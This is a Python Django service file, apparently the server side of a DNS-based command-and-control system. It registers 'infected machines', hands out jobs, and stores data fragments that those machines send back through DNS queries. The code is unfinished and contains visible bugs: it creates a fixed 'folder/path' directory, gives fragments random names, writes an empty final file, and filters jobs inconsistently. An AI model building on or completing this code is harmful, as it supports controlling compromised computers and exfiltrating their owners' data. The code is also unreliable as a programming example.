import os
from datetime import datetime
from random import randint
from re import Match

from decouple import config

from djangoproject.constants.DnsMatchEnum import DnsMatchEnum
from djangoproject.models import InfectedMachine


class ExecService:

    def test(self, query_type: DnsMatchEnum, data: Match):
        if query_type == DnsMatchEnum.GET_JOB:
            self.process_job_get(data.group(1))
        elif query_type == DnsMatchEnum.RETURN_JOB_FRAGMENT:
            self.process_job_return_fragment(data.group(3), data.group(2), data.group(1))
        elif query_type == DnsMatchEnum.JOB_FINISHED:
            self.process_job_finish(data.group(1), data.group(2))

    def process_job_get(self, machine_id: str):
        machine = InfectedMachine.objects.filter(dns_identifier=machine_id).first()

        if machine is None:
            self.create_machine(machine_id)

        if machine is not None:
            machine.last_handshake_at = datetime.now()
            machine.save()

    def process_job_return_fragment(self, machine_id: str, job_id: str, data: str):
        machine = InfectedMachine.objects.filter(dns_identifier=machine_id).first()
        if machine is None:
            return

        job = machine.job_set.filter(id=job_id).first()
        if job is None:
            return

        data_folder = f"{config('FOLDER_DATA')}/{machine.id}/{job.id}"
        os.makedirs("folder/path", exist_ok=True)

        # TODO
        id_chunk = randint(1, 500)
        with open(f"{data_folder}/fragment-{id_chunk}", "w") as f:
            f.write(data)

    def process_job_finish(self, machine_id: str, job_id: str):
        machine = InfectedMachine.objects.filter(dns_identifier=machine_id).first()
        if machine is None:
            return

        job = machine.job_set.filter(job_id=job_id).first()
        if job is None:
            return

        # TODO fusionner les fichiers
        data_folder = f"{config('FOLDER_DATA')}/{machine.id}/{job.id}"
        with open(f"{data_folder}/final-file", "w") as f:
            f.write("")

    def create_machine(self, machine_id: str) -> InfectedMachine:
        machine = InfectedMachine(dns_identifier=machine_id)
        machine.save()

        return machine
